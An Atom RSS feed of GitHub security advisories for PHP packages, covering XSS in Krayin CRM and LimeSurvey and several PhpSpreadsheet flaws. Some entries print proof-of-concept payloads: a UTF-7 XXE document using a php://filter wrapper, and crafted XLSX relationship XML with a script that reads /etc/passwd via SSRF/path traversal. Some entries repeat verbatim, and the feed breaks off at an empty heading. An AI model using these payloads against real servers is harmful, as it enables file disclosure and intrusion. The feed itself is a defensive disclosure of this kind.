<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-10-08T03:07:32.676Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[krayin/laravel-crm] Krayin CRM vulnerable to Cross Site Scripting (XSS) via the organization name]]></title>
        <id>https://github.com/advisories/GHSA-74q2-6jp4-3rqq</id>
        <link href="https://github.com/advisories/GHSA-74q2-6jp4-3rqq"/>
        <updated>2024-10-07T19:27:15.000Z</updated>
        <content type="html"><![CDATA[<p>Krayin CRM v1.3.0 is vulnerable to Cross Site Scripting (XSS) via the organization name field in <code>/admin/contacts/organizations/edit/2</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45932">https://nvd.nist.gov/vuln/detail/CVE-2024-45932</a></li>
<li><a href="https://github.com/AslamMahi/CVE-Aslam-Mahi/blob/main/Laravel%20CRM%20v1.3.0/CVE-2024-45932.md">https://github.com/AslamMahi/CVE-Aslam-Mahi/blob/main/Laravel%20CRM%20v1.3.0/CVE-2024-45932.md</a></li>
<li><a href="https://krayincrm.com">https://krayincrm.com</a></li>
<li><a href="https://github.com/advisories/GHSA-74q2-6jp4-3rqq">https://github.com/advisories/GHSA-74q2-6jp4-3rqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74q2-6jp4-3rqq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T18:31:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[limesurvey/limesurvey] LimeSurvey Cross Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-c7xm-rwqj-pgcj</id>
        <link href="https://github.com/advisories/GHSA-c7xm-rwqj-pgcj"/>
        <updated>2024-10-07T19:26:38.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in LimeSurvey before 6.5.12+240611 allows a remote attacker to execute arbitrary code via a crafted script to the title and comment fields.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28709">https://nvd.nist.gov/vuln/detail/CVE-2024-28709</a></li>
<li><a href="https://github.com/LimeSurvey/LimeSurvey/commit/c844c4fba81cc26ffe6544bf095bad6252910bc0">https://github.com/LimeSurvey/LimeSurvey/commit/c844c4fba81cc26ffe6544bf095bad6252910bc0</a></li>
<li><a href="https://www.limesurvey.org">https://www.limesurvey.org</a></li>
<li><a href="https://github.com/advisories/GHSA-c7xm-rwqj-pgcj">https://github.com/advisories/GHSA-c7xm-rwqj-pgcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7xm-rwqj-pgcj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T18:31:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[limesurvey/limesurvey] LimeSurvey Cross Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-632q-77qj-c89q</id>
        <link href="https://github.com/advisories/GHSA-632q-77qj-c89q"/>
        <updated>2024-10-07T19:02:00.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in LimeSurvey before 6.5.0+240319 allows a remote attacker to execute arbitrary code via a lack of input validation and output encoding in the Alert Widget's message component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28710">https://nvd.nist.gov/vuln/detail/CVE-2024-28710</a></li>
<li><a href="https://github.com/LimeSurvey/LimeSurvey/commit/c2fd60f94bc1db275f20cbb27a3135a9bdfb7f10">https://github.com/LimeSurvey/LimeSurvey/commit/c2fd60f94bc1db275f20cbb27a3135a9bdfb7f10</a></li>
<li><a href="https://www.limesurvey.org">https://www.limesurvey.org</a></li>
<li><a href="https://github.com/advisories/GHSA-632q-77qj-c89q">https://github.com/advisories/GHSA-632q-77qj-c89q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-632q-77qj-c89q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T18:31:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T22:30:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45293">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T22:30:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45293">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T22:30:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45293">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45292">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45292">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45292">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T22:29:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
